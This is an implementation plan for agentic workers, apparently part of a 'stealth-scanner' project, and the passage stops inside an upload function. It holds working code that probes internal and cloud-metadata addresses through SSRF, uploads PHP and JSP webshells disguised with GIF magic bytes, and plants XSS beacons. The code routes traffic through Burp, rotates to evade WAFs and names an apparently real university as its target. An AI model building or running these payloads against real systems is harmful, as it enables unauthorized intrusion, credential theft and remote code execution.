# Vuln Scan Phase Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 在 stealth-scanner 的 api_fuzz 与 exploit 之间插入 `vuln_scan` 阶段，自动执行三个专项 scanner：SSRF 候选发现、文件上传利用、存储型 XSS 检测。

**Architecture:** 三个新 pipeline 脚本（ssrf_scan.py / upload_scan.py / xss_scan.py）从 DB 的 pages/suspicious_points 读取目标，通过 Burp proxy 发送请求，结果写 hunt_queue 或 suspicious_points；run_scan.py 新增 handle_vuln_scan 顺序调用三者；stealth-scanner SKILL.md 在 vuln_scan 阶段末尾增加 Claude Code 直调 MCP Collaborator 做 OOB SSRF 验证的步骤。

**Tech Stack:** Python 3.11+, requests, sqlite3, TOOLS/utils/waf_rotate.RotatingFetcher, TOOLS/db/cookie_helper.get_auth_cookie_header, Burp proxy http://127.0.0.1:8080

---

## File Map

| 文件 | 类型 | 职责 |
|---|---|---|
| `TOOLS/pipeline/ssrf_scan.py` | 新建 | SSRF 候选参数识别 + 内网 IP 直接探测，写 hunt_queue |
| `TOOLS/pipeline/upload_scan.py` | 新建 | 文件上传端点发现 + SVG/PHP/JSP 上传测试，写 suspicious_points/findings |
| `TOOLS/pipeline/xss_scan.py` | 新建 | 表单 text input 存储型 XSS 注入验证，写 suspicious_points |
| `TOOLS/tests/test_ssrf_scan.py` | 新建 | ssrf_scan 单元测试 |
| `TOOLS/tests/test_upload_scan.py` | 新建 | upload_scan 单元测试 |
| `TOOLS/tests/test_xss_scan.py` | 新建 | xss_scan 单元测试 |
| `TOOLS/run_scan.py` | 修改 | handle_api_fuzz → set_phase('vuln_scan')；新增 handle_vuln_scan；HANDLERS 加 vuln_scan |
| `TOOLS/tests/test_run_scan.py` | 修改 | 更新 probe_next_phase 相关断言（已在 api_fuzz 变更中完成，此任务只需确认） |
| `.claude/skills/stealth-scanner/SKILL.md` | 修改 | 状态机加 vuln_scan 行；加 Collaborator OOB 步骤 |

---

## 关键约束（所有任务共用）

- 所有 HTTP 请求走 `BURP_PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}`
- `requests.get/post(..., proxies=BURP_PROXY, verify=False, timeout=10)`
- 请求间隔默认 1.0s，`RotatingFetcher(max_rotations=3, rotate_delay=30.0)`
- `get_auth_cookie_header(db_path, seed_url, role='primary')` 注入 Cookie
- `INSERT OR IGNORE` + `cursor.rowcount > 0` 检测是否新插入
- `uv run pytest TOOLS/tests/test_xxx.py -v` 运行测试

---

## Task 1: TDD RED — 创建三个测试文件

**Files:**
- Create: `TOOLS/tests/test_ssrf_scan.py`
- Create: `TOOLS/tests/test_upload_scan.py`
- Create: `TOOLS/tests/test_xss_scan.py`

- [ ] **Step 1: 创建 test_ssrf_scan.py**

```python
# TOOLS/tests/test_ssrf_scan.py
"""ssrf_scan.py 单元测试。"""
import json
import sqlite3
import sys
from pathlib import Path

import pytest

_TOOLS = Path(__file__).resolve().parent.parent
if str(_TOOLS) not in sys.path:
    sys.path.insert(0, str(_TOOLS))

from pipeline.ssrf_scan import (
    find_ssrf_candidates,
    is_ssrf_response,
    write_ssrf_candidate,
)


@pytest.fixture
def conn():
    c = sqlite3.connect(":memory:")
    c.row_factory = sqlite3.Row
    c.executescript("""
        CREATE TABLE targets (id INTEGER PRIMARY KEY AUTOINCREMENT, domain TEXT);
        CREATE TABLE scan_state (id INTEGER PRIMARY KEY, seed_url TEXT, phase TEXT);
        CREATE TABLE pages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT UNIQUE,
            status TEXT DEFAULT 'queued',
            suspicious_params_json TEXT,
            forms_json TEXT
        );
        CREATE TABLE hunt_queue (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            method TEXT NOT NULL,
            url TEXT NOT NULL,
            query_string TEXT,
            endpoint_type TEXT,
            business_intent TEXT,
            risk_hint TEXT DEFAULT 'Medium',
            status TEXT DEFAULT 'queued',
            source TEXT DEFAULT 'auto',
            notes TEXT,
            UNIQUE(method, url, query_string)
        );
    """)
    c.execute("INSERT INTO targets (domain) VALUES ('example.com')")
    c.execute("INSERT INTO scan_state (id, seed_url, phase) VALUES (1, 'https://example.com', 'vuln_scan')")
    c.commit()
    yield c
    c.close()


def test_find_ssrf_candidates_from_url_query_param(conn):
    conn.execute("INSERT INTO pages (url, status) VALUES ('https://example.com/api?url=http://x.com', 'visited')")
    conn.commit()
    results = find_ssrf_candidates(conn)
    assert len(results) == 1
    assert results[0]["param"] == "url"
    assert "example.com/api" in results[0]["url"]


def test_find_ssrf_candidates_from_redirect_param(conn):
    conn.execute("INSERT INTO pages (url, status) VALUES ('https://example.com/login?redirect=http://a.com', 'visited')")
    conn.commit()
    results = find_ssrf_candidates(conn)
    assert any(r["param"] == "redirect" for r in results)


def test_find_ssrf_candidates_from_suspicious_params_json(conn):
    sp = json.dumps([{"name": "callback", "type": "text"}, {"name": "q", "type": "text"}])
    conn.execute("INSERT INTO pages (url, status, suspicious_params_json) VALUES ('https://example.com/api', 'visited', ?)", (sp,))
    conn.commit()
    results = find_ssrf_candidates(conn)
    assert any(r["param"] == "callback" for r in results)
    assert not any(r["param"] == "q" for r in results)  # q is not SSRF-prone


def test_find_ssrf_candidates_skips_non_ssrf_params(conn):
    conn.execute("INSERT INTO pages (url, status) VALUES ('https://example.com/search?q=hello&page=2', 'visited')")
    conn.commit()
    results = find_ssrf_candidates(conn)
    assert len(results) == 0


def test_is_ssrf_response_detects_passwd(conn):
    assert is_ssrf_response(200, "root:x:0:0:root:/root:/bin/bash") is True


def test_is_ssrf_response_detects_aws_metadata(conn):
    assert is_ssrf_response(200, '{"instanceId":"i-0abcd1234","privateIp":"10.0.0.1"}') is True


def test_is_ssrf_response_detects_ssh_banner(conn):
    assert is_ssrf_response(200, "SSH-2.0-OpenSSH_8.0") is True


def test_is_ssrf_response_normal_404(conn):
    assert is_ssrf_response(404, "Not Found") is False


def test_is_ssrf_response_normal_200_html(conn):
    assert is_ssrf_response(200, "<html><body>Welcome</body></html>") is False


def test_write_ssrf_candidate_inserts_new_row(conn):
    target_id = conn.execute("SELECT id FROM targets LIMIT 1").fetchone()[0]
    inserted = write_ssrf_candidate(
        conn, target_id, "https://example.com/api?url=x", "url", "127.0.0.1 responded with SSH", "High"
    )
    assert inserted is True
    row = conn.execute("SELECT * FROM hunt_queue").fetchone()
    assert row is not None
    assert row["endpoint_type"] == "ssrf_candidate"
    assert "ssrf" in (row["notes"] or "")


def test_write_ssrf_candidate_deduplicates(conn):
    target_id = conn.execute("SELECT id FROM targets LIMIT 1").fetchone()[0]
    write_ssrf_candidate(conn, target_id, "https://example.com/api?url=x", "url", "evidence", "High")
    inserted2 = write_ssrf_candidate(conn, target_id, "https://example.com/api?url=x", "url", "evidence2", "High")
    assert inserted2 is False
    assert conn.execute("SELECT count(*) FROM hunt_queue").fetchone()[0] == 1
```

- [ ] **Step 2: 创建 test_upload_scan.py**

```python
# TOOLS/tests/test_upload_scan.py
"""upload_scan.py 单元测试。"""
import json
import sqlite3
import sys
import uuid
from pathlib import Path

import pytest

_TOOLS = Path(__file__).resolve().parent.parent
if str(_TOOLS) not in sys.path:
    sys.path.insert(0, str(_TOOLS))

from pipeline.upload_scan import (
    build_payloads,
    extract_uploaded_url,
    find_upload_targets,
    is_webshell_output,
)


@pytest.fixture
def conn():
    c = sqlite3.connect(":memory:")
    c.row_factory = sqlite3.Row
    c.executescript("""
        CREATE TABLE targets (id INTEGER PRIMARY KEY AUTOINCREMENT, domain TEXT);
        CREATE TABLE scan_state (id INTEGER PRIMARY KEY, seed_url TEXT, phase TEXT);
        CREATE TABLE pages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT UNIQUE,
            status TEXT DEFAULT 'queued',
            forms_json TEXT
        );
        CREATE TABLE suspicious_points (
            id TEXT PRIMARY KEY,
            url TEXT,
            param TEXT,
            method TEXT DEFAULT 'POST',
            test_type TEXT,
            evidence TEXT,
            source TEXT,
            reasoning TEXT,
            risk TEXT DEFAULT 'High',
            test_status TEXT DEFAULT 'untested',
            created_at TEXT
        );
        CREATE TABLE findings (
            id TEXT PRIMARY KEY,
            target_id INTEGER,
            type TEXT,
            url TEXT,
            param TEXT,
            method TEXT,
            payload TEXT,
            evidence TEXT,
            risk TEXT,
            cvss TEXT,
            remediation TEXT,
            confirmed_at TEXT
        );
    """)
    c.execute("INSERT INTO targets (domain) VALUES ('example.com')")
    c.execute("INSERT INTO scan_state (id, seed_url, phase) VALUES (1, 'https://example.com', 'vuln_scan')")
    c.commit()
    yield c
    c.close()


def test_find_upload_targets_from_forms_json(conn):
    forms = json.dumps([{
        "action": "https://example.com/upload",
        "method": "POST",
        "inputs": [
            {"tag": "input", "name": "file", "type": "file", "value": "", "hidden": False},
            {"tag": "input", "name": "submit", "type": "submit", "value": "Upload", "hidden": False},
        ]
    }])
    conn.execute("INSERT INTO pages (url, status, forms_json) VALUES ('https://example.com/', 'visited', ?)", (forms,))
    conn.commit()
    targets = find_upload_targets(conn)
    assert len(targets) == 1
    assert targets[0]["upload_url"] == "https://example.com/upload"
    assert targets[0]["field_name"] == "file"


def test_find_upload_targets_from_url_pattern(conn):
    conn.execute("INSERT INTO pages (url, status) VALUES ('https://example.com/file/upload', 'visited')")
    conn.execute("INSERT INTO pages (url, status) VALUES ('https://example.com/api/avatar/update', 'visited')")
    conn.commit()
    targets = find_upload_targets(conn)
    urls = [t["upload_url"] for t in targets]
    assert "https://example.com/file/upload" in urls
    assert "https://example.com/api/avatar/update" in urls


def test_find_upload_targets_skips_non_upload(conn):
    conn.execute("INSERT INTO pages (url, status) VALUES ('https://example.com/search', 'visited')")
    conn.commit()
    targets = find_upload_targets(conn)
    assert len(targets) == 0


def test_build_payloads_contains_svg(conn):
    payloads = build_payloads()
    assert "svg_xss" in payloads
    svg = payloads["svg_xss"]
    assert b"onload" in svg["data"]
    assert svg["filename"].endswith(".svg")
    assert "svg" in svg["content_type"]


def test_build_payloads_contains_php_webshell(conn):
    payloads = build_payloads()
    assert "php_webshell" in payloads
    php = payloads["php_webshell"]
    assert b"shell_exec" in php["data"]
    assert b"GIF89a" in php["data"]  # magic bytes bypass


def test_build_payloads_contains_jsp_webshell(conn):
    payloads = build_payloads()
    assert "jsp_webshell" in payloads
    jsp = payloads["jsp_webshell"]
    assert b"Runtime" in jsp["data"]


def test_is_webshell_output_linux_root_ls(conn):
    assert is_webshell_output("bin\nboot\ndev\netc\nhome\nlib\nopt\nroot\nsrv\ntmp\nusr\nvar\n") is True


def test_is_webshell_output_normal_html(conn):
    assert is_webshell_output("<html><body>Not Found</body></html>") is False


def test_is_webshell_output_partial_match(conn):
    # Must have multiple root-level dir names to avoid false positives
    assert is_webshell_output("bin\nboot\netc") is True


def test_extract_uploaded_url_from_json_url_field(conn):
    body = '{"code":0,"data":{"url":"/uploads/shell.php"}}'
    result = extract_uploaded_url(body, "https://example.com")
    assert result == "https://example.com/uploads/shell.php"


def test_extract_uploaded_url_from_json_path_field(conn):
    body = '{"success":true,"path":"/files/test.jpg"}'
    result = extract_uploaded_url(body, "https://example.com")
    assert result == "https://example.com/files/test.jpg"


def test_extract_uploaded_url_returns_none_when_not_found(conn):
    body = '{"error":"file too large"}'
    result = extract_uploaded_url(body, "https://example.com")
    assert result is None
```

- [ ] **Step 3: 创建 test_xss_scan.py**

```python
# TOOLS/tests/test_xss_scan.py
"""xss_scan.py 单元测试。"""
import json
import sqlite3
import sys
from pathlib import Path

import pytest

_TOOLS = Path(__file__).resolve().parent.parent
if str(_TOOLS) not in sys.path:
    sys.path.insert(0, str(_TOOLS))

from pipeline.xss_scan import (
    beacon_in_response,
    build_beacon,
    find_xss_targets,
    write_xss_sp,
)


@pytest.fixture
def conn():
    c = sqlite3.connect(":memory:")
    c.row_factory = sqlite3.Row
    c.executescript("""
        CREATE TABLE targets (id INTEGER PRIMARY KEY AUTOINCREMENT, domain TEXT);
        CREATE TABLE scan_state (id INTEGER PRIMARY KEY, seed_url TEXT, phase TEXT);
        CREATE TABLE pages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT UNIQUE,
            status TEXT DEFAULT 'queued',
            forms_json TEXT
        );
        CREATE TABLE suspicious_points (
            id TEXT PRIMARY KEY,
            url TEXT,
            param TEXT,
            method TEXT DEFAULT 'GET',
            test_type TEXT,
            evidence TEXT,
            source TEXT,
            reasoning TEXT,
            risk TEXT DEFAULT 'High',
            test_status TEXT DEFAULT 'untested',
            created_at TEXT
        );
    """)
    c.execute("INSERT INTO targets (domain) VALUES ('example.com')")
    c.execute("INSERT INTO scan_state (id, seed_url, phase) VALUES (1, 'https://example.com', 'vuln_scan')")
    c.commit()
    yield c
    c.close()


def test_find_xss_targets_text_input(conn):
    forms = json.dumps([{
        "action": "https://example.com/search",
        "method": "GET",
        "inputs": [{"tag": "input", "name": "q", "type": "text", "value": "", "hidden": False}]
    }])
    conn.execute("INSERT INTO pages (url, status, forms_json) VALUES ('https://example.com/', 'visited', ?)", (forms,))
    conn.commit()
    targets = find_xss_targets(conn)
    assert len(targets) == 1
    assert targets[0]["param"] == "q"
    assert targets[0]["form_action"] == "https://example.com/search"


def test_find_xss_targets_textarea(conn):
    forms = json.dumps([{
        "action": "https://example.com/comment",
        "method": "POST",
        "inputs": [{"tag": "textarea", "name": "content", "type": "text", "value": "", "hidden": False}]
    }])
    conn.execute("INSERT INTO pages (url, status, forms_json) VALUES ('https://example.com/post', 'visited', ?)", (forms,))
    conn.commit()
    targets = find_xss_targets(conn)
    assert any(t["param"] == "content" for t in targets)


def test_find_xss_targets_skips_hidden_and_submit(conn):
    forms = json.dumps([{
        "action": "https://example.com/form",
        "method": "POST",
        "inputs": [
            {"tag": "input", "name": "_token", "type": "hidden", "value": "abc", "hidden": True},
            {"tag": "input", "name": "submit_btn", "type": "submit", "value": "Submit", "hidden": False},
            {"tag": "input", "name": "comment", "type": "text", "value": "", "hidden": False},
        ]
    }])
    conn.execute("INSERT INTO pages (url, status, forms_json) VALUES ('https://example.com/', 'visited', ?)", (forms,))
    conn.commit()
    targets = find_xss_targets(conn)
    params = [t["param"] for t in targets]
    assert "comment" in params
    assert "_token" not in params
    assert "submit_btn" not in params


def test_build_beacon_unique():
    b1 = build_beacon("aabb1122")
    b2 = build_beacon("ccdd3344")
    assert b1 != b2
    assert "xssbeacon_aabb1122" in b1
    assert "<img" in b1


def test_beacon_in_response_detects_unescaped():
    uid = "aabb1122"
    beacon = build_beacon(uid)
    html = f"<html><body>{beacon}</body></html>"
    assert beacon_in_response(uid, html) is True


def test_beacon_in_response_not_triggered_when_escaped():
    uid = "aabb1122"
    beacon = build_beacon(uid)
    escaped = beacon.replace("<", "&lt;").replace(">", "&gt;")
    html = f"<html><body>{escaped}</body></html>"
    assert beacon_in_response(uid, html) is False


def test_beacon_in_response_not_triggered_when_absent():
    assert beacon_in_response("aabb1122", "<html><body>nothing here</body></html>") is False


def test_write_xss_sp_stored(conn):
    inserted = write_xss_sp(
        conn,
        url="https://example.com/comment",
        param="content",
        beacon_uid="aabb1122",
        page_url="https://example.com/comments",
        is_stored=True,
    )
    assert inserted is True
    row = conn.execute("SELECT * FROM suspicious_points").fetchone()
    assert row["test_type"] == "stored_xss"
    assert row["risk"] == "High"


def test_write_xss_sp_reflected_is_low(conn):
    write_xss_sp(
        conn,
        url="https://example.com/search",
        param="q",
        beacon_uid="ccdd3344",
        page_url="https://example.com/search",
        is_stored=False,
    )
    row = conn.execute("SELECT * FROM suspicious_points").fetchone()
    assert row["risk"] == "Low"


def test_write_xss_sp_deduplicates(conn):
    write_xss_sp(conn, "https://example.com/x", "q", "uid1", "https://example.com/x", True)
    inserted2 = write_xss_sp(conn, "https://example.com/x", "q", "uid2", "https://example.com/x", True)
    # Same URL+param should not duplicate (different beacon UIDs in evidence, but same SP fingerprint)
    count = conn.execute("SELECT count(*) FROM suspicious_points").fetchone()[0]
    assert count == 1
    assert inserted2 is False
```

- [ ] **Step 4: 验证三个测试文件均 RED**

```bash
uv run pytest TOOLS/tests/test_ssrf_scan.py TOOLS/tests/test_upload_scan.py TOOLS/tests/test_xss_scan.py -v
```

期望输出：`ERROR ... ModuleNotFoundError: No module named 'pipeline.ssrf_scan'`（以及其他两个）

- [ ] **Step 5: Commit**

```bash
git add TOOLS/tests/test_ssrf_scan.py TOOLS/tests/test_upload_scan.py TOOLS/tests/test_xss_scan.py
git commit -m "test: add TDD RED tests for ssrf_scan, upload_scan, xss_scan"
```

---

## Task 2: 实现 ssrf_scan.py (TDD GREEN)

**Files:**
- Create: `TOOLS/pipeline/ssrf_scan.py`

- [ ] **Step 1: 创建 TOOLS/pipeline/ssrf_scan.py**

```python
# TOOLS/pipeline/ssrf_scan.py
"""SSRF 候选参数发现：识别含 URL 类参数的端点，内网 IP 直接探测，写 hunt_queue。

用法:
  uv run python TOOLS/pipeline/ssrf_scan.py --target "台州学院"
  uv run python TOOLS/pipeline/ssrf_scan.py --target "台州学院" --delay 1.5 --max-rotations 3

输出:
  [SSRF_SCAN] candidates={n} probed={m} found={k}
"""
from __future__ import annotations

import argparse
import json
import re
import sqlite3
import sys
import time
from pathlib import Path
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import requests
import urllib3

urllib3.disable_warnings()

_TOOLS = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_TOOLS))

from db.cookie_helper import get_auth_cookie_header  # noqa: E402
from db.db_utils import connect, find_db  # noqa: E402
from utils.waf_rotate import RotatingFetcher  # noqa: E402

BURP_PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

SSRF_PARAMS: frozenset[str] = frozenset({
    "url", "redirect", "src", "img", "callback", "link", "proxy",
    "forward", "fetch", "dest", "target", "host", "domain", "api",
    "path", "load", "server", "request", "uri", "next", "goto",
    "returnurl", "return_url", "continue", "to", "from", "resource",
    "endpoint", "site", "location", "out",
})

INTERNAL_TARGETS = [
    "http://127.0.0.1/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:6379/",
    "http://127.0.0.1:8080/",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/computeMetadata/v1/",
    "http://10.0.0.1/",
    "http://192.168.1.1/",
]

_SSRF_BODY_INDICATORS = [
    "root:x:0:0",
    "SSH-2.0",
    "instanceId",
    "privateIp",
    "ami-",
    "iam/security-credentials",
    "computeMetadata",
    "redis_version",
    "tcp_port",
    "<!DOCTYPE html",
    "<?xml",
]

_SSRF_IP_RE = re.compile(r"(?:^|\s|[,\[{\"'])(?:10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.1[6-9]\.\d+\.\d+|172\.2\d\.\d+\.\d+|172\.3[01]\.\d+\.\d+|127\.\d+\.\d+\.\d+)")


def is_ssrf_response(status: int, body: str) -> bool:
    """Heuristic: response looks like internal/cloud content."""
    if any(ind in body for ind in _SSRF_BODY_INDICATORS):
        return True
    if _SSRF_IP_RE.search(body) and status == 200:
        return True
    return False


def find_ssrf_candidates(conn: sqlite3.Connection) -> list[dict]:
    """从 pages 表 URL 参数 + suspicious_params_json 找 SSRF 候选。"""
    candidates: list[dict] = []
    seen: set[tuple[str, str]] = set()

    rows = conn.execute(
        "SELECT url FROM pages WHERE status='visited' AND url LIKE '%?%'"
    ).fetchall()
    for row in rows:
        raw_url = row[0] if isinstance(row, tuple) else row["url"]
        if not raw_url:
            continue
        parsed = urlparse(raw_url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        for param_name in params:
            if param_name.lower() in SSRF_PARAMS:
                key = (raw_url.split("?")[0], param_name)
                if key not in seen:
                    seen.add(key)
                    candidates.append({"url": raw_url, "param": param_name, "source": "url_param"})

    rows2 = conn.execute(
        "SELECT url, suspicious_params_json FROM pages WHERE suspicious_params_json IS NOT NULL"
    ).fetchall()
    for row in rows2:
        raw_url = row[0] if isinstance(row, tuple) else row["url"]
        sp_json = row[1] if isinstance(row, tuple) else row["suspicious_params_json"]
        if not sp_json:
            continue
        try:
            sp_list = json.loads(sp_json)
            for sp in sp_list:
                pname = sp.get("name", "") if isinstance(sp, dict) else ""
                if pname.lower() in SSRF_PARAMS:
                    key = (raw_url, pname)
                    if key not in seen:
                        seen.add(key)
                        candidates.append({"url": raw_url, "param": pname, "source": "suspicious_params"})
        except (json.JSONDecodeError, AttributeError):
            pass

    return candidates


def probe_ssrf(
    url: str,
    param: str,
    payload: str,
    cookie: str | None,
    fetcher: RotatingFetcher,
    delay: float,
) -> tuple[int, str]:
    """向 url 的 param 注入 payload，返回 (status_code, body)。"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    probe_url = urlunparse(parsed._replace(query=new_query))

    headers: dict[str, str] = {"User-Agent": "Mozilla/5.0"}
    if cookie:
        headers["Cookie"] = cookie

    def _fetch() -> requests.Response:
        return requests.get(  # noqa: S113
            probe_url, headers=headers, proxies=BURP_PROXY, timeout=10, verify=False  # noqa: S501
        )

    try:
        resp, _, _ = fetcher.fetch_with_rotation(_fetch)
        time.sleep(delay)
        if isinstance(resp, requests.Response):
            return resp.status_code, resp.text[:4096]
    except Exception:  # noqa: BLE001
        pass
    time.sleep(delay)
    return 0, ""


def write_ssrf_candidate(
    conn: sqlite3.Connection,
    target_id: int,
    url: str,
    param: str,
    evidence: str,
    risk_hint: str,
) -> bool:
    """写入 hunt_queue，返回 True 表示新插入。"""
    notes = f"ssrf | param={param} | {evidence[:200]}"
    try:
        cursor = conn.execute(
            """INSERT OR IGNORE INTO hunt_queue
               (target_id, method, url, query_string, endpoint_type,
                business_intent, risk_hint, status, source, notes)
               VALUES (?, 'GET', ?, '', 'ssrf_candidate', 'ssrf_probe', ?, 'queued', 'auto', ?)""",
            (target_id, url, risk_hint, notes),
        )
        conn.commit()
        return cursor.rowcount > 0
    except sqlite3.Error as e:
        print(f"  [warn] hunt_queue 写入失败 {url}: {e}", file=sys.stderr)
        return False


def main() -> None:
    parser = argparse.ArgumentParser(description="SSRF 候选参数发现")
    parser.add_argument("--target", required=True)
    parser.add_argument("--delay", type=float, default=1.0)
    parser.add_argument("--max-rotations", type=int, default=3, dest="max_rotations")
    args = parser.parse_args()

    db_path = find_db(args.target)
    conn = connect(db_path)

    row = conn.execute("SELECT seed_url FROM scan_state WHERE id=1").fetchone()
    seed_url = row["seed_url"] if row else None
    if not seed_url:
        print("[error] 无 seed_url", file=sys.stderr)
        conn.close()
        sys.exit(1)

    target_row = conn.execute("SELECT id FROM targets LIMIT 1").fetchone()
    target_id: int = target_row["id"] if target_row else 1

    cookie = get_auth_cookie_header(str(db_path), seed_url, role="primary")
    candidates = find_ssrf_candidates(conn)
    print(f"[ssrf_scan] 候选: {len(candidates)} 个  delay={args.delay}s")

    fetcher = RotatingFetcher(max_rotations=args.max_rotations, rotate_delay=30.0)
    found = 0
    probed = 0

    for cand in candidates:
        for payload in INTERNAL_TARGETS:
            status, body = probe_ssrf(cand["url"], cand["param"], payload, cookie, fetcher, args.delay)
            probed += 1
            if is_ssrf_response(status, body):
                evidence = f"payload={payload} status={status} body_snippet={body[:100]}"
                inserted = write_ssrf_candidate(conn, target_id, cand["url"], cand["param"], evidence, "High")
                if inserted:
                    found += 1
                    print(f"  [!!!] SSRF? {cand['url']} param={cand['param']} payload={payload}")
                break  # 一个 param 找到一次即可

    conn.close()
    print(f"\n[SSRF_SCAN] candidates={len(candidates)} probed={probed} found={found}")


if __name__ == "__main__":
    main()
```

- [ ] **Step 2: 运行 ssrf_scan 测试**

```bash
uv run pytest TOOLS/tests/test_ssrf_scan.py -v
```

期望：全部 PASS（11 个测试）

- [ ] **Step 3: Commit**

```bash
git add TOOLS/pipeline/ssrf_scan.py TOOLS/tests/test_ssrf_scan.py
git commit -m "feat: add ssrf_scan pipeline with internal IP probing"
```

---

## Task 3: 实现 upload_scan.py (TDD GREEN)

**Files:**
- Create: `TOOLS/pipeline/upload_scan.py`

- [ ] **Step 1: 创建 TOOLS/pipeline/upload_scan.py**

```python
# TOOLS/pipeline/upload_scan.py
"""文件上传利用：发现上传端点，测试 SVG/PHP/JSP webshell 上传，验证执行。

用法:
  uv run python TOOLS/pipeline/upload_scan.py --target "台州学院"

输出:
  [UPLOAD_SCAN] targets={n} tested={m} found={k}
"""
from __future__ import annotations

import argparse
import json
import re
import sqlite3
import sys
import time
import uuid
from datetime import datetime
from pathlib import Path
from urllib.parse import urljoin, urlparse

import requests
import urllib3

urllib3.disable_warnings()

_TOOLS = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_TOOLS))

from db.cookie_helper import get_auth_cookie_header  # noqa: E402
from db.db_utils import connect, find_db  # noqa: E402
from utils.waf_rotate import RotatingFetcher  # noqa: E402

BURP_PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

UPLOAD_PATH_RE = re.compile(
    r"/(?:upload|file|attach|avatar|import|image|photo|media|resource|assets|static/upload)",
    re.IGNORECASE,
)

# GIF89a magic bytes + PHP payload（bypass 简单 MIME 检测）
_GIF_MAGIC = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"

SVG_XSS_DATA = b"<svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'><circle r='50' cx='50' cy='50'/></svg>"
PHP_WEBSHELL_DATA = _GIF_MAGIC + b'<?php echo shell_exec("ls /"); ?>'
JSP_WEBSHELL_DATA = (
    b'<%@ page import="java.util.*,java.io.*"%>'
    b'<%Process p=Runtime.getRuntime().exec("ls /");'
    b'OutputStream os=response.getOutputStream();'
    b'byte b[]=new byte[4096];int len;'
    b'while((len=p.getInputStream().read(b))!=-1){os.write(b,0,len);}%>'
)

# Linux 根目录下应有的目录名，3+ 命中即认为是 ls 输出
_LS_ROOT_DIRS = frozenset({"bin", "boot", "dev", "etc", "home", "lib", "opt", "proc", "root", "srv", "tmp", "usr", "var"})

# URL 字段名（JSON 响应中常见的文件 URL 字段）
_URL_FIELDS = ("url", "path", "src", "file", "fileUrl", "file_url", "filePath", "file_path", "link", "href", "location", "uri")

_URL_PATTERN_IN_BODY = re.compile(r'["\']([/][^"\'<>\s]{3,200}\.[a-zA-Z0-9]{1,10})["\']')


def build_payloads() -> dict[str, dict]:
    """返回 {payload_name: {filename, content_type, data}}。"""
    uid = uuid.uuid4().hex[:8]
    return {
        "svg_xss": {
            "filename": f"test_{uid}.svg",
            "content_type": "image/svg+xml",
            "data": SVG_XSS_DATA,
        },
        "php_webshell": {
            "filename": f"test_{uid}.php",
            "content_type": "image/gif",
            "data": PHP_WEBSHELL_DATA,
        },
        "php_jpg": {
            "filename": f"test_{uid}.php.jpg",
            "content_type": "image/jpeg",
            "data": PHP_WEBSHELL_DATA,
        },
        "jsp_webshell": {
            "filename": f"test_{uid}.jsp",
            "content_type": "text/plain",
            "data": JSP_WEBSHELL_DATA,
        },
    }


def find_upload_targets(conn: sqlite3.Connection) -> list[dict]:
    """从 forms_json + URL 模式发现上传端点。"""
    targets: list[dict] = []
    seen: set[str] = set()

    rows = conn.execute(
        "SELECT url, forms_json FROM pages WHERE forms_json IS NOT NULL AND status='visited'"
    ).fetchall()
    for row in rows:
        page_url = row[0] if isinstance(row, tuple) else row["url"]
        forms_raw = row[1] if isinstance(row, tuple) else row["forms_json"]
        if not forms_raw:
            continue
        try:
            forms = json.loads(forms_raw)
        except (json.JSONDecodeError, TypeError):
            continue
        for form in forms:
            inputs = form.get("inputs", [])
            file_inputs = [i for i in inputs if i.get("type", "").lower() == "file"]
            if not file_inputs:
                continue
            action = form.get("action", page_url) or page_url
            field_name = file_inputs[0].get("name") or "file"
            if action not in seen:
                seen.add(action)
                targets.append({"upload_url": action, "field_name": field_name, "page_url": page_url, "source": "form"})

    rows2 = conn.execute("SELECT url FROM pages WHERE status='visited'").fetchall()
    for row in rows2:
        page_url = row[0] if isinstance(row, tuple) else row["url"]
        if not page_url:
            continue
        parsed = urlparse(page_url)
        if UPLOAD_PATH_RE.search(parsed.path):
            if page_url not in seen:
                seen.add(page_url)
                targets.append({"upload_url": page_url, "field_name": "file", "page_url": page_url, "source": "url_pattern"})

    return targets


def is_webshell_output(body: str) -> bool:
    """True if body looks like output of 'ls /'."""
    lines = {line.strip().lower() for line in body.splitlines() if line.strip()}
    hits = lines & {d.lower() for d in _LS_ROOT_DIRS}
    return len(hits) >= 3


def extract_uploaded_url(response_body: str, base_url: str) -> str | None:
    """Try to extract the uploaded file URL from a JSON or HTML response."""
    try:
        data = json.loads(response_body)
        def _search(obj: object) -> str | None:
            if isinstance(obj, dict):
                for field in _URL_FIELDS:
                    val = obj.get(field)
                    if isinstance(val, str) and val.startswith("/"):
                        return urljoin(base_url, val)
                    if isinstance(val, str) and val.startswith("http"):
                        return val
                for v in obj.values():
                    result = _search(v)
                    if result:
                        return result
            elif isinstance(obj, list):
                for item in obj:
                    result = _search(item)
                    if result:
                        return result
            return None
        found = _search(data)
        if found:
            return found
    except (json.JSONDecodeError, AttributeError):
        pass

    # Fallback: regex scan for path-like strings ending in an extension
    m = _URL_PATTERN_IN_BODY.search(response_body)
    if m:
        path = m.group(1)
        return urljoin(base_url, path)
    return None


def upload_file(
    upload_url: str,
    field_name: str,
    filename: str,
    content_type: str,
    data: bytes,
    cookie: str | None,
    fetcher: RotatingFetcher,
    delay: float,
) -> tuple[int, str]:
    """POST multipart upload; returns (status_code, response_body)."""
